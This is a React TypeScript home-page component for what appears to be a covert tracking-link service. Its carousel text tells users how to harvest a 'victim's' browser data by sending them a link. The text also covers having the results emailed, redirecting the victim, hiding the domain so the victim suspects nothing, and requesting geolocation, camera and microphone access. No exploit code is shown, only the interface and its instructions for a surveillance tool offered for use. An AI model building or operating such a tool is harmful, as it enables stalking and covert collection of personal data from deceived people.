import React from "react";

import "./Home.scss";
import ContentWrapper from "../Molecules/ContentWrapper";
import StoriesCarousel from "../Organisms/StoriesCarousel";
import TrackingRequestForm from "../Organisms/TrackingRequestForm";
import Background1 from "../../Assets/Stories/Background1.jpeg";
import Background2 from "../../Assets/Stories/Background2.jpeg";
import Background3 from "../../Assets/Stories/Background3.jpeg";
import Background4 from "../../Assets/Stories/Background4.jpeg";
import Background5 from "../../Assets/Stories/Background5.jpeg";
import Background6 from "../../Assets/Stories/Background6.jpeg";
import { Story } from "../../Types/Types";

const Home: React.FC = () => {
  const stories: Story[] = [
    {
      id: 1,
      backgroundSrc: Background1,
      text: "Do you want to get personal data of some person and don’t know what to do? Fill out the form, send the victim a link and find out everything about it that the browser knows.",
    },
    {
      id: 2,
      backgroundSrc: Background2,
      text: "An email will be sent to the entered email with the data that was received.",
    },
    {
      id: 3,
      backgroundSrc: Background3,
      text: 'After clicking on the generated link, the victim will be redirected to the link that you enter in the "Redirect URL" field.',
    },
    {
      id: 4,
      backgroundSrc: Background4,
      text: 'The "Hide URL address" option allows you to hide our domain so that the victim does not suspect anything.',
    },
    {
      id: 5,
      backgroundSrc: Background5,
      text: 'Use the "Try to get geolocation", "Take a photo" and "Record an audio" options at your own risk, as this will request additional permissions from the victim, which may provoke suspicion.',
    },
    {
      id: 6,
      backgroundSrc: Background6,
      text: "Copy the link and send it to anyone. Keep in mind that the link has a limited number of uses (usually only one) and then becomes unavailable.",
    },
  ];

  return (
    <ContentWrapper>
      <div className="home-content">
        <TrackingRequestForm />
        <StoriesCarousel stories={stories} />
      </div>
    </ContentWrapper>
  );
};

export default Home;
